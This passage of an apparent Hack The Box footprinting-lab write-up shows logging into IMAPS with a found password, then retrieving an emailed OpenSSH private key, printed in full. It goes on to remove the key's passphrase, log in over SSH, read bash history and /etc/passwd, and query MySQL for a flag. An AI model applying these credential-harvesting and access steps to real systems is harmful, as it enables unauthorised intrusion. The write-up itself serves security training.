    0060 - 96 07 77 5a 0a 8a 5f 43-21 b1 5b 18 9a c9 0f 06   ..wZ.._C!.[.....
    0070 - df 5b 93 f7 77 ca cb 43-19 65 22 9e 87 0b b7 d5   .[..w..C.e".....
    0080 - a2 51 ec c4 e2 f8 88 fc-cc 90 88 9a d3 e3 78 ec   .Q............x.
    0090 - 30 34 ea c6 01 6f 50 ca-9f 89 26 f6 c3 54 c7 0c   04...oP...&..T..
    00a0 - 46 d9 29 d8 53 ce e1 92-86 53 da 48 83 02 ee c4   F.).S....S.H....
    00b0 - f0 81 28 e7 e2 5b e4 6a-95 4b 2a b7 bb f8 72 8f   ..(..[.j.K*...r.

    Start Time: 1765466820
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 30B99B34A755D53B4F5A3EA4216CB499C349CFA82CB38A0D8205B71F7216F9E6
    Session-ID-ctx: 
    Resumption PSK: 4C58C917AD1B362D43186CC32FAF00A09E14EF5F0CD363B31D993EA6C059A244E092BC1406B9E41E5A9937C94B6581DC
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 0a 0d ac 66 db 5c be 83-7a 18 db e0 6d bd 97 e9   ...f.\..z...m...
    0010 - 93 8d dc f8 3e 01 41 99-dd 01 c4 74 a8 d4 31 43   ....>.A....t..1C
    0020 - 33 43 a3 01 5c 9c 99 53-4d 03 b9 ec be fe 53 39   3C..\..SM.....S9
    0030 - a8 c0 9a 5b 19 c8 7a 2f-ba a1 13 42 0e 2b 4d e6   ...[..z/...B.+M.
    0040 - 5d e5 e3 df a2 f9 da cc-31 73 1a d9 d0 2a 3c fa   ].......1s...*<.
    0050 - 7d 72 eb 15 52 8f 05 cb-61 fe 20 43 ee a4 59 ff   }r..R...a. C..Y.
    0060 - 17 e7 0c e4 7c 0a 8f 10-90 df 9b cc 25 7c 7c c6   ....|.......%||.
    0070 - f2 a7 fb a6 b4 cc c4 26-10 06 10 3d 6c ba 0e c9   .......&...=l...
    0080 - 8a ed a5 a0 d5 bc b9 96-f1 5e 65 9b 42 4a 3f f9   .........^e.BJ?.
    0090 - 74 ed 7e c8 9d 20 9b 78-54 b4 ec 69 85 4e 0b 42   t.~.. .xT..i.N.B
    00a0 - 41 02 96 9d cc 5a 85 d6-fc c8 fa f0 0e 25 bf 5e   A....Z.......%.^
    00b0 - 1a a2 18 2e 1c 7c d2 6f-e2 55 84 bd a1 56 31 fb   .....|.o.U...V1.

    Start Time: 1765466820
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
```
After we connected with openssl to imaps, we must login with Tom account. 
```
a1 login tom NMds732Js2761
```
>This is a special syntax made for imaps
```
a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
```
Another method to list all IMAPS folders is to use `list`
```
a2 list "" *
```
```
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
a OK List completed (0.001 + 0.000 secs).
```
For now, let's dive into these folders.
`select` allows us to navigate into mailboxes.
```
a3 select Important
```

```
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS # <- here we can easily see that no files are inside.
* 0 RECENT
* OK [UIDVALIDITY 1636509062] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
a OK [READ-WRITE] Select completed (0.005 + 0.000 + 0.004 secs).
```

```
a4 select INBOX
```

```
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS # <- this one has one file.
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
a OK [READ-WRITE] Select completed (0.008 + 0.000 + 0.007 secs).
```

**Notes**: All mailboxes were empty except the INBOX folder.

### SSH Key Discovery

To read the file present, we can use the `fetch` command.
> If we want to select more than 1 file, replace 1 with 1:5, 3:15, etc., if they exist.
```
a5 fetch 1 BODY[]
```

```
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd
hfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHFdND3urVhelyuQ89BtJqB
abmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/ong1nlguuJGc1s47tqKBP
HuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZISazgCz/D6IdVMXilAUFKQ
X1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06OqMb9StNGOnkqY8rIHPga
H/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtbDFv9M3j0SjsMTr2Q0B0O
jKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmpNrS7qSjxO0N143zMRDZy
Ex74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpAVj6YYkMDtL86RN6o8u1x
3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVeoYK9OJJ3hJeJ7SpCt2GG
cAAAdIRrOunEazrpwAAAAHc3NoLXJzYQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxy
U9XWTS+UBbY3lVFH0t+F+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQ
qYreqEj6pjTj8wguR0SdhfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHF
dND3urVhelyuQ89BtJqBabmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/o
ng1nlguuJGc1s47tqKBPHuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZIS
azgCz/D6IdVMXilAUFKQX1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06O
qMb9StNGOnkqY8rIHPgaH/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtb
DFv9M3j0SjsMTr2Q0B0OjKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmp
NrS7qSjxO0N143zMRDZyEx74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpA
Vj6YYkMDtL86RN6o8u1x3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVe
oYK9OJJ3hJeJ7SpCt2GGcAAAADAQABAAACAQC0wxW0LfWZ676lWdi9ZjaVynRG57PiyTFY
jMFqSdYvFNfDrARixcx6O+UXrbFjneHA7OKGecqzY63Yr9MCka+meYU2eL+uy57Uq17ZKy
zH/oXYQSJ51rjutu0ihbS1Wo5cv7m2V/IqKdG/WRNgTFzVUxSgbybVMmGwamfMJKNAPZq2
xLUfcemTWb1e97kV0zHFQfSvH9wiCkJ/rivBYmzPbxcVuByU6Azaj2zoeBSh45ALyNL2Aw
HHtqIOYNzfc8rQ0QvVMWuQOdu/nI7cOf8xJqZ9JRCodiwu5fRdtpZhvCUdcSerszZPtwV8
uUr+CnD8RSKpuadc7gzHe8SICp0EFUDX5g4Fa5HqbaInLt3IUFuXW4SHsBPzHqrwhsem8z
tjtgYVDcJR1FEpLfXFOC0eVcu9WiJbDJEIgQJNq3aazd3Ykv8+yOcAcLgp8x7QP+s+Drs6
4/6iYCbWbsNA5ATTFz2K5GswRGsWxh0cKhhpl7z11VWBHrfIFv6z0KEXZ/AXkg9x2w9btc
dr3ASyox5AAJdYwkzPxTjtDQcN5tKVdjR1LRZXZX/IZSrK5+Or8oaBgpG47L7okiw32SSQ
5p8oskhY/He6uDNTS5cpLclcfL5SXH6TZyJxrwtr0FHTlQGAqpBn+Lc3vxrb6nbpx49MPt
DGiG8xK59HAA/c222dwQAAAQEA5vtA9vxS5n16PBE8rEAVgP+QEiPFcUGyawA6gIQGY1It
4SslwwVM8OJlpWdAmF8JqKSDg5tglvGtx4YYFwlKYm9CiaUyu7fqadmncSiQTEkTYvRQcy
tCVFGW0EqxfH7ycA5zC5KGA9pSyTxn4w9hexp6wqVVdlLoJvzlNxuqKnhbxa7ia8vYp/hp
6EWh72gWLtAzNyo6bk2YykiSUQIfHPlcL6oCAHZblZ06Usls2ZMObGh1H/7gvurlnFaJVn
CHcOWIsOeQiykVV/l5oKW1RlZdshBkBXE1KS0rfRLLkrOz+73i9nSPRvZT4xQ5tDIBBXSN
y4HXDjeoV2GJruL7qAAAAQEA/XiMw8fvw6MqfsFdExI6FCDLAMnuFZycMSQjmTWIMP3cNA
2qekJF44lL3ov+etmkGDiaWI5XjUbl1ZmMZB1G8/vk8Y9ysZeIN5DvOIv46c9t55pyIl5+
fWHo7g0DzOw0Z9ccM0lr60hRTm8Gr/Uv4TgpChU1cnZbo2TNld3SgVwUJFxxa//LkX8HGD
vf2Z8wDY4Y0QRCFnHtUUwSPiS9GVKfQFb6wM+IAcQv5c1MAJlufy0nS0pyDbxlPsc9HEe8
EXS1EDnXGjx1EQ5SJhmDmO1rL1Ien1fVnnibuiclAoqCJwcNnw/qRv3ksq0gF5lZsb3aFu
kHJpu34GKUVLy74QAAAQEA+UBQH/jO319NgMG5NKq53bXSc23suIIqDYajrJ7h9Gef7w0o
eogDuMKRjSdDMG9vGlm982/B/DWp/Lqpdt+59UsBceN7mH21+2CKn6NTeuwpL8lRjnGgCS
t4rWzFOWhw1IitEg29d8fPNTBuIVktJU/M/BaXfyNyZo0y5boTOELoU3aDfdGIQ7iEwth5
vOVZ1VyxSnhcsREMJNE2U6ETGJMY25MSQytrI9sH93tqWz1CIUEkBV3XsbcjjPSrPGShV/
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
)
```

We found the ssh private key sent from admin to tom in them mailbox.


---

## System Access

### SSH Key Configuration

To extract the key, let's create a file.
```
touch sshkey_private
```

And tried to use it with SSH.
```
ssh -i sshkey_private tom@10.129.202.20
```

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'sshkey_private' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "sshkey_private": bad permissions
```
SSH told us that our file has bad permissions (too insecure).

The recommended permission for SSH is 600 because we want only the owner to be able to use it.
```
sudo chmod 600 sshkey_private
```

To modify the current protection passphrase for the private key, we can use `ssh-keygen`:
```
ssh-keygen -p -f sshkey_private -m PEM
```
> -p tells ssh-keygen to change the passphrase
> -m is a security measure to ensure the file is in a good format.

```
Key has comment 'tom@NIXHARD'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
```

### SSH Connection

After working on our private key, we can retry to connect with `ssh`.
```
ssh -i sshkey_private tom@10.129.202.20
```

Enter the previously set passphrase.
```
Enter passphrase for key 'sshkey_private': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 11 Dec 2025 05:07:24 PM UTC

  System load:  0.0               Processes:               181
  Usage of /:   67.0% of 5.70GB   Users logged in:         0
  Memory usage: 31%               IPv4 address for ens192: 10.129.202.20
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
tom@NIXHARD:~$ 
```
We are logged in via SSH to Tom's computer!

### System Reconnaissance

To start, I'd like to take a look at Tom's bash history.
```
history
```

```
    1  mysql -u tom -p # <- He has a MySQL account
    2  ssh-keygen -t rsa -b 4096 # <- This is likely our key.
    3  ls
    4  ls -al
    5  cd .ssh/
    6  ls
    7  cd mail/
    8  ls
    9  ls -al
   10  cd .imap/
   11  ls
   12  cd Important/
   13  ls
   14  set term=xterm
   15  vim key # <- there is a key somewhere
   16  cat ~/.ssh/id_rsa
   17  vim key
   18  ls
   19  mv key ..
   20  cd ..
   21  ls
   22  mv key Important/
   23  mv Important/key ../
   24  cd ..
   25  ls
   26  ls -l
   27  id
   28  cat /etc/passwd
   29  ls
   30  cd mail/
   31  ls
   32  ls -al
   33  cd mail/
   34  ls
   35  rm Meetings 
   36  rm TESTING Important 
   37  ls -l
   38  cd ..
   39  ls -al
   40  mv mail/key Maildir/.Important/new/
   41  mv Maildir/.Important/new/key Maildir/new/
   42  cd Maildir/new/
   43  ls
   44  cd ..
   45  tree .
   46  cat cur/key
   47  cd cur/
   48  ls
   49  ls -al
   50  cat "key:2,"
   51  mysql -u tom -p 
   52  mysql -u tom -p
   53  ls
   54  ls -la
   55  history
```

We can take a look at the tom home with `tree` command
```
tom@NIXHARD:~$ tree
.
├── mail
└── Maildir
    ├── cur
    │   └── key:2,S
    ├── dovecot.index.cache
    ├── dovecot.index.log
    ├── dovecot.list.index.log
    ├── dovecot-uidlist
    ├── dovecot-uidvalidity
    ├── dovecot-uidvalidity.618b2589
    ├── new
    └── tmp

5 directories, 7 files
```

Let's try to grep to see if we can find an "HTB" occurrence.
```
grep -ri "HTB" .
```

```
./Maildir/cur/key:2,S:HELO dev.inlanefreight.htb
./Maildir/cur/key:2,S:MAIL FROM:<tech@dev.inlanefreight.htb>
./Maildir/cur/key:2,S:RCPT TO:<bob@inlanefreight.htb>
./Maildir/cur/key:2,S:From: [Admin] <tech@inlanefreight.htb>
./Maildir/cur/key:2,S:To: <tom@inlanefreight.htb>
./.viminfo:$inlanefreight.htb
./.viminfo::%s/example.com/inlanefreight.htb/g
./.viminfo:|2,0,1636508569,,"%s/example.com/inlanefreight.htb/g"
```
But not what we're looking for in these files.

```
cat /etc/passwd | grep -i "HTB"
```

no output

After snooping around Tom's home, my next checkpoint was to connect to his MySQL account

---

## Database Access

### MySQL Connection

```bash
mysql -u tom -p
```

I entered Tom's credentials and it worked!
```
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

### Database Enumeration

Now we have access to Tom's MySQL. We can start by looking at all databases with `show databases;`

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)
```

We want to find a specific user password, so let's `use users;` database. 
```
mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
To take a look inside the database, we have to know the column names, so we use `show columns from users;`.
```
mysql> show columns from users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | YES  |     | NULL    |       |
| username | varchar(50) | YES  |     | NULL    |       |
| password | varchar(50) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0.01 sec)
```
Now we know that there are 3 columns: id, username, and password.

### Flag Capture

We want to display (`SELECT`) all users named (`* FROM users WHERE username LIKE`) "HTB" 

```
mysql> SELECT * FROM users WHERE username LIKE "HTB";
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4...............sncif7ds |
+------+----------+------------------------------+
1 row in set (0.01 sec)
```

![success](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-3/success.png)